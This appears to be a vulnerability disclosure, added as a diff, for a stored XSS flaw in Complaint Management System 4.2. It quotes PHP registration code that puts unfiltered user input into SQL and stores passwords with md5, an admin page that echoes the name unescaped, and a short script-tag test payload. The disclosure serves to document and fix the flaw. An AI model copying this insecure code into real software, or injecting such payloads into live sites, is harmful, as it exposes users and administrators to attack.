@@ -1,0 +1,42 @@
+# Exploit Title: Complaint Management System 4.2 - Persistent Cross-Site Scripting
+# Author: Besim ALTINOK
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/complaint-management-sytem/
+# Version: v4.2
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+------ Details:
+
+1- Vulnerable code is here: http://localhost/cms/users/registration.php
+2- Vulnerable code:
+
+Insert user registration information to the DB without filtering.
+
+if(isset($_POST['submit']))
+{
+$fullname=$_POST['fullname'];
+$email=$_POST['email'];
+$password=md5($_POST['password']);
+$contactno=$_POST['contactno'];
+$status=1;
+$query=mysqli_query($con,"insert into
+users(fullName,userEmail,password,contactNo,status)
+values('$fullname','$email','$password','$contactno','$status')");
+$msg="Registration successfull. Now You can login !";
+}
+?>
+
+3- In the admin dashboard:
+
+Get fullName from DB and print it without any filtering
+
+<tr>
+<td colspan="2"><b><?php echo $row['fullName'];?>'s profile</b></td>
+</tr>
+
+4- If we insert "fullName" as "script>prompt(2)</script>", we can perform
+this attack as "Stored XSS"
+
+5- Picture in the Attachemnt
+---------------------------------------------------
